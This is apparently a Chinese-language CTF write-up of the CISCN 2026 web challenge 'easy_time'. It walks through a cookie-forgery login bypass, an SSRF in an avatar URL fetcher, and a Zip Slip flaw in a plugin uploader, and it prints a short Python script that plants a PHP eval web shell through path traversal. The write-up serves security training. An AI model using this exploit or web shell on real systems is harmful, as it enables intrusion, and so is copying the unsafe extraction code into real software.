---
title: CISCN 2026 Web easy_time
date: 2026-05-12T14:13:01+08:00
slug: ciscn2026-web-easy-time
description: Cookie 伪造登录 + Zip Slip 目录穿越写马 + SSRF，三步拿到 flag
cover: /img/posts/ciscn2026-web-easy-time/01.png
categories: [CTF]
tags: [CISCN, Web, SSRF, 文件上传, Zip Slip]
toc: true
comment: false
not_cover: true
---

我这是复现，所以有些环境可能会有出入，借鉴了一些大佬的思路（[第十九届全国大学生信息安全竞赛半决赛 Web 题 easy_time 详细题解：Cookie 伪造 + Zip Slip + SSRF 拿 Flag](https://blog.csdn.net/2301_76794844/article/details/159472594)）。

![题目环境](/img/posts/ciscn2026-web-easy-time/01.png)

## a. 登录界面

这是一个登录界面，我们的常规思维就是想会不会是 admin+admin 或者 admin+admin123 的这种格式，结果都不是。然后我们打开题目附件发现：

```python
def is_logged_in() -> bool:
    return flask.request.cookies.get("visited") == "yes" and bool(flask.request.cookies.get("user"))
```

这是成功登录的条件：在 Cookie 头里面传入两个参数，一个是 `visited`，值为 `yes`；另外一个是检查 Cookie 头里面 `user` 是否存在赋值。于是我们构建 payload：

```text
Cookie: visited=yes; user=admin
```

但是随后我们用 bp 将该 payload 发包给目的网址，发现没有任何反应，于是我们继续代码审计，发现有两处代码说得很清楚。

### 1. 抓包路径必须为根目录

```python
@app.route('/')
def home():
    if is_logged_in():
        return flask.redirect(flask.url_for("dashboard"))
    return flask.redirect(flask.url_for("login"))
```

因为登录校验是在根目录做的校验，所以抓包也应该在根目录进行。当满足登录条件的时候，网页会重定向到 `/dashboard` 这个界面，反之不满足就应该跳转回 login。

### 2. 登录校验器

```python
def login_required(view):
    def wrapped(*args, **kwargs):
        if not is_logged_in():
            next_url = flask.request.full_path if flask.request.query_string else flask.request.path
            return flask.redirect(flask.url_for("login", next=next_url))
        return view(*args, **kwargs)
    wrapped.__name__ = view.__name__
    return wrapped
```

这是 Flask 的登录校验器，每当你访问一个页面它都会进行一次校验。当我们满足前面 Cookie 的两个条件的时候就会继续跳转，反之重定向到 `/login` 界面。所以这里也就告诉我们，如果只是依靠 bp 简单发包，是不足以满足页面的持续校验的。这里我们要到 Burp Suite 里面设置 **Session Handling Rule**。

#### Session Handling Rule 设置

这个设置可以让每个网页的访问都满足两个 Cookie 的值，从而满足登录校验器：

1. **第一步**：点开设置添加

![第一步 点开设置添加](/img/posts/ciscn2026-web-easy-time/02.png)

2. **第二步**：设定特定数值（同样一步使用两次，第一次设置 `visited=yes`，第二次设置 `user=admin`——源码只对 visited 有要求为 yes，对 user 的数值没有特定要求，只要有值就行）

![第二步 设定 visited 和 user](/img/posts/ciscn2026-web-easy-time/03.png)

3. **第三步**：设置应用范围

![第三步 设置应用范围](/img/posts/ciscn2026-web-easy-time/04.png)

### 3. BP 发包

在根目录下抓包，添加 Cookie 数值，之后发包，满足登录校验，页面重定向到 `/dashboard`。

![BP 发包重定向到 dashboard](/img/posts/ciscn2026-web-easy-time/05.png)

![dashboard 界面](/img/posts/ciscn2026-web-easy-time/06.png)

## b. 后台面板（SSRF / 文件上传）

跳转之后有三个界面，我们进入 `/头像` 看看，发现存在一个「头像远程 URL」功能，结合源码：

```python
def fetch_remote_avatar_info(url: str):
    if not url:
        return None
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        return None
    if not parsed.hostname:
        return None
    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "question-app/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            content = resp.read()
            return {
                "content_snippet": content,
                "status": getattr(resp, "status", None),
                "content_type": resp.headers.get("Content-Type", ""),
                "content_length": resp.headers.get("Content-Length", ""),
            }
    except Exception:
        return None
```

根据源码，我们发现这个「头像远程 URL」功能只针对协议和域名地址进行了解析，并没有校验。再根据附件之前有个 YAML 文件中暴露内部的端口 `:80`：

![头像远程 URL 功能](/img/posts/ciscn2026-web-easy-time/07.png)

我们尝试访问 80 端口，返回了信息，说明存在 **SSRF**：

![访问 80 端口确认 SSRF](/img/posts/ciscn2026-web-easy-time/08.png)

通常这个时候我们会想到的是通过目录穿越来获取 flag，如下：

![目录穿越尝试](/img/posts/ciscn2026-web-easy-time/09.png)

发现并没有回显。于是我们继续查看这个页面的功能，发现前面存在一个「插件上传」的页面，要求上传压缩包，之后会自动解压。查看插件上传的源码，发现这个插件上传的操作只是检验了文件后缀和文件名：

```python
@app.route('/plugin/upload', methods=['GET', 'POST'])
@login_required
def upload_plugin():
    if flask.request.method == 'GET':
        return flask.render_template('plugin_upload.html', error=None, ok=None, files=None)
    file = flask.request.files.get('plugin')
    if not file or not file.filename:
        return flask.render_template('plugin_upload.html', error='请选择一个 zip 文件', ok=None, files=None), 400
    filename = secure_filename(file.filename)
    if not filename.lower().endswith('.zip'):
        return flask.render_template('plugin_upload.html', error='仅支持 .zip 文件', ok=None, files=None), 400
    saved = UPLOAD_DIR / f"{uuid4().hex}-{filename}"
    file.save(saved)
    dest = PLUGIN_DIR / f"{Path(filename).stem}-{uuid4().hex[:8]}"
    dest.mkdir(parents=True, exist_ok=True)
    try:
        print(saved, dest)
        extracted = safe_upload(saved, dest)
    except Exception:
        shutil.rmtree(dest, ignore_errors=True)
        return flask.render_template('plugin_upload.html', error='解压失败：压缩包内容不合法', ok=None, files=None), 400
    return flask.render_template('plugin_upload.html', error=None, ok='上传并解压成功', files=extracted)
```

这个函数并没有对文件内部类似于 `../../../` 的目录穿越做限制。更危险的是，这所谓的「安全上传」函数在获取到文件名之后，直接将解压目录和文件名进行拼接（**Zip Slip**）：

```python
def safe_upload(zip_path: Path, dest_dir: Path) -> list[str]:
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            target = os.path.join(dest_dir, info.filename)
            if info.is_dir():
                os.makedirs(target, exist_ok=True)
            else:
                os.makedirs(os.path.dirname(target), exist_ok=True)
                with open(target, 'wb') as f:
                    f.write(z.read(info.filename))
```

我们想着把压缩包做成那种目录穿越的形式，将木马文件写出系统，然后通过访问木马文件来获取 flag。这里附上大佬的 exp：

```python
import zipfile

with zipfile.ZipFile("exp.zip", "w") as zipf:
    zipf.writestr("../../../../../../../var/www/html/shell.php", "<?php eval($_GET[1]);?>")
```

我们将 exp.zip 上传之后，进行 shell.php 文件的访问：

![上传 exp.zip 后的文件列表](/img/posts/ciscn2026-web-easy-time/10.png)

发现有很多文件，我们依次尝试，最后发现在 tmp 目录下存在一个 flag：

![在 tmp 目录发现 flag](/img/posts/ciscn2026-web-easy-time/11.png)

于是我们读取 flag：

![读取 flag](/img/posts/ciscn2026-web-easy-time/12.png)

得到最终 flag：

```text
flag{0960b1f1-413c-429c-bf42-91713c7700a2}
```
